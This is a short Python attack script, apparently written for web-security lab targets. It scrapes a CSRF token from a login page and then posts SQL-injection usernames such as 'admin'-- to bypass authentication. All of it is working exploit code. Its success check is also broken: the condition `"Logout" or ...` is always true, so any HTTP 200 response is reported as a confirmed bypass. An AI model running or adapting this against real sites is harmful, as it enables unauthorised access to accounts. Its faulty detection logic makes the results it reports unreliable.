import requests

from bs4 import BeautifulSoup

from utils.auxiliary import *

payloads = [
    "admin'--",
    "admin'#",
    "administrator'--",
    "administrator'#"
]

names = [
    "admin",
    "administrator",
    "root",
    "guest",
    "user",
    "test",
    "default",
    "demo"
]


def get_csrf_token(url, s):
    log = Auxiliary(__name__)
    log.set_config()
    r = s.get(url + '/login')
    soup = BeautifulSoup(r.text, 'html.parser')
    log.logger.info(f"[*] Trying to collect CSRF token on {url}")
    for input in soup.find_all('input'):
        if input.get('name') == 'csrf':
            log.logger.info(f"[+] Found CSRF token {input.get('value')}")
            return input.get('value')


def try_login_sqli(url):
    s = requests.Session()
    log = Auxiliary(__name__)
    log.set_config()
    csrf_token = get_csrf_token(url, s)
    for pld in payloads:
        data = {
            "csrf": csrf_token,
            "username": pld,
            "password": "doesNotMatter"
        }
        log.logger.info(
            f"[*] Trying login SQLi on endpoint {url + '/login'} with {data}")
        r = s.post(url=url + "/login", data=data)
        if r.status_code == 200:
            if "Logout" or "Log out" in r.text:
                log.logger.info(
                    f"[+] Found logout on the page. Confirmed \
                    login SQLi with {data.get('username')}")
                return pld
